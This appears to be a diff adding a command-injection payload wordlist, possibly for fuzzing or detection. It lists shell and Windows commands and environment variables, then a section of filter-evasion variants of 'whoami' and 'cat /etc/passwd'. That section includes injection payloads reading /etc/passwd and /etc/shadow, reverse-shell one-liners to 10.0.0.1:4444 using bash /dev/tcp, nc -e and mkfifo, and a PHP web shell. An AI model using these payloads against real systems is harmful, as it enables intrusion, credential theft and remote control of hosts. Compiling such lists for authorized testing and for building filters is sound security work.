@@ -1,0 +1,203 @@
+# Basic Commands
+ls
+cat
+chmod
+chown
+cp
+curl
+wget
+find
+grep
+head
+tail
+kill
+ps
+netstat
+ping
+ifconfig
+nc
+netcat
+whoami
+id
+ssh
+scp
+tar
+zip
+gzip
+unzip
+dir
+type
+attrib
+copy
+del
+ipconfig
+net
+tasklist
+taskkill
+shutdown
+regedit
+powershell
+sc
+# Environment Variables (Unix/Linux & Windows)
+$PATH
+$HOME
+$SHELL
+$USER
+%SYSTEMROOT%
+%WINDIR%
+%TEMP%
+%USERPROFILE%
+$IFS
+$LD_LIBRARY_PATH
+$PWD
+$LANG
+$HOSTNAME
+$PS1
+$BASH
+$TERM
+%COMSPEC%
+%PROGRAMFILES%
+%APPDATA%
+%LOCALAPPDATA%
+# Dangerous Commands (Additional)
+rm -rf
+mv
+dd
+mkfs
+mkfifo
+mknod
+exec
+system
+fork
+pipe
+socat
+telnet
+ftp
+tftp
+rsync
+awk
+sed
+perl
+python
+php
+ruby
+lua
+node
+nohup
+screen
+tmux
+crontab
+at
+sudo
+su
+doas
+pkexec
+chroot
+mount
+umount
+fdisk
+parted
+mkswap
+swapon
+swapoff
+iptables
+ufw
+firewalld
+tcpdump
+nmap
+strace
+ltrace
+gdb
+ldd
+strings
+xxd
+hexdump
+base64
+openssl
+ssh-keygen
+ssh-agent
+ssh-add
+env
+printenv
+export
+alias
+unalias
+history
+.htaccess
+/etc/passwd
+/etc/shadow
+/proc/self/environ
+/dev/null
+/dev/zero
+/dev/random
+/dev/tcp
+/dev/udp
+# Command Chaining & Evasion
+\r
+\t
+\x20
+\x09
+\x0a
+\x0d
+%0a
+%0d
+%00
+%20
+%09
+%0A
+%0D
+$(printf '\x20')
+$(echo -e '\x20')
+`echo -e '\x20'`
+{echo,test}
+a=l;b=s;$a$b
+who$(printf '\x20')ami
+who$@ami
+who*ami
+who?ami
+whoam[i]
+w'h'o'a'm'i
+w"h"o"a"m"i
+w\ho\a\mi
+whoam%0ai
+whoam%0di
+whoam%00i
+; cat /etc/passwd
+| id
+`whoami`
+$(uname -a)
+\n/bin/ls -al\n
+; system('cat /etc/shadow')
+%0Acat%20/etc/passwd
+a|id|
+a;id;
+a);id
+& ver
+| whoami
+%0Aipconfig
+`ping 127.0.0.1`
+&& net user
+|| dir C:\
+; sleep 5
+| ping -c 10 127.0.0.1
+`ping -n 10 localhost`
+$(ping -i 5 127.0.0.1)
+{I}{F}{S}cat${IFS}/etc/passwd
+c\at /et\c/pas\swd
+'c'at /etc/passwd
+; cat /etc/hosts
+| head -n 5 /etc/shadow
+`tail /var/log/auth.log`
+> /tmp/exploit.txt
+; bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
+| nc -e /bin/sh 10.0.0.1 4444
+`mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f`
+; echo $PATH
+`env`
+$(printenv)
+--option=malicious
+-option $(id)
+--load-library=exploit.so
+<?php system($_GET['cmd']); ?>
+<!--#exec cmd="/bin/ls"-->
+__import__('os').system('id')
